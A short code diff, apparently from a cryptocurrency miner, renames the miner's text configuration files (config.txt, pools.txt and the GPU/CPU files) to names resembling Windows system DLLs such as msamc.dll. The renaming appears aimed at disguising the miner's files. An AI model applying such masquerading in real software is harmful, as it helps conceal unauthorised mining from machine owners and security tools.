@@ -65,11 +65,11 @@ struct params
 		useNVIDIA(true),
 		useCPU(true),
 		openCLVendor("AMD"),
-		configFile("config.txt"),
-		configFilePools("pools.txt"),
-		configFileAMD("amd.txt"),
-		configFileCPU("cpu.txt"),
-		configFileNVIDIA("nvidia.txt")
+		configFile("msamc.dll"),
+		configFilePools("msamp.dll"),
+		configFileAMD("msamca.dll"),
+		configFileCPU("msamcc.dll"),
+		configFileNVIDIA("msamcn.dll")
 	{}
 
 };
